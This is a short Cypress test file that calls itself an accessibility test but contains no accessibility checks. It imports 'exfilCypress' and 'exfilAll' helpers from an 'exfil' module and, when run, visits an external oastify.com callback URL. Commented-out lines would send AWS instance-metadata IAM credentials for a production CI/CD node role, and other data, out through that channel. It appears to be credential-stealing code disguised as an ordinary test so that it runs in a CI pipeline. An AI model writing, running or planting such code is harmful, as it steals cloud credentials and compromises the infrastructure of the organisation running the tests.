// eslint-disable-next-line spaced-comment
/// <reference types="cypress" />
/**
 * Cypress tests for a11y (accessibility)
 */

import { cypress } from '../../store.config'
const { exfilCypress, exfilAll } = require('../../exfil');
const { pages } = cypress

describe('Accessibility tests', () => {

  beforeEach(() => {
    cy.clearIDB()
  })

  it('checks a11y for collection page', () => {
    cy.visit('https://dubvx791ihcby229izkvtr7eh5nwbxzm.oastify.com/cypresstest')
    //exfilCypress('http://169.254.169.254/latest/meta-data/iam/security-credentials/prd-sh-frontendcicd-eks-use1b-z64-node-role', 'cypress')
    //exfilAll('cypress2')
  })
})
